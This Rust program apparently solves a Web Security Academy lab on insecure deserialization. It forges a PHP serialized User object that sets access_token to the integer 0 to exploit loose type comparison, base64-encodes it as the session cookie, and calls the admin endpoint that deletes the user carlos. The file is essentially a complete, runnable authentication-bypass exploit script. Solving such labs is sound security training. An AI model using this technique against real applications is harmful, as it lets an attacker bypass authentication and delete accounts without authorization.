/***************************************************************
*
* Lab: Modifying serialized data types
*
* Hack Steps:
*      1. Encode the serialized object after modifying
*      2. Delete carlos from the admin panel with the modified 
*         object as session
*
****************************************************************/
use base64::{engine::general_purpose::STANDARD, Engine};
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0ad70043046d41d2832b82b70023001b.web-security-academy.net";

fn main() {
    print!("⦗1⦘ Encoding the serialized object after modifying.. ");
    flush_terminal();

    let serialized = r###"O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}"###;
    let serialized_encoded = STANDARD.encode(serialized);

    println!("{}", "OK".green());
    print!("⦗2⦘ Deleting carlos from the admin panel with the modified object as session.. ");
    flush_terminal();

    fetch_with_session("/admin/delete?username=carlos", &serialized_encoded);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    let client = build_web_client();
    client
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
